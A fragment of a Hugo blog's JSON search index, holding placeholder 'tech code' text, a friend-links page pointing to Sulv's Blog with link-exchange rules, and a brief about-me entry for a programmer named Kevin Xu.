科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代码 科技代","title":"Tech"},{"content":" Sulv\u0026#39;s Blog 一个记录技术、阅读、生活的博客 👉友链格式 名称： Sulv\u0026rsquo;s Blog 网址： https://www.sulvblog.cn 图标： https://www.sulvblog.cn/img/Q.gif 描述： 一个记录技术、阅读、生活的博客 👉友链申请要求 秉承互换友链原则、文章定期更新、不能有太多广告、个人描述字数控制在15字内\n👉Hugo博客交流群 787018782\n","permalink":"https://modesty258.github.io/links/","summary":"Sulv\u0026#39;s Blog 一个记录技术、阅读、生活的博客 👉友链格式 名称： Sulv\u0026rsquo;s Blog 网址： https://www.sulvblog.cn 图标： https://www.sulvblog.cn/img/Q.gif 描述： 一个记录技术、阅读、生活的博客 👉友链申请要求 秉承互换友链原则、文章定期更新、不能有太多广告、个人描述字数控制在15字内 👉Hugo博客交流群 787018782","title":"🤝友链"},{"content":"关于我\n英文名: Kevin Xu 职业: 程序员 运动: 跑步、乒乓球、爬山 ","permalink":"https://modesty258.github.io/about/","summary":"关于我 英文名: Kevin Xu 职业: 程序员 运动: 跑步、乒乓球、爬山","title":"🙋🏻‍♂️关于"}]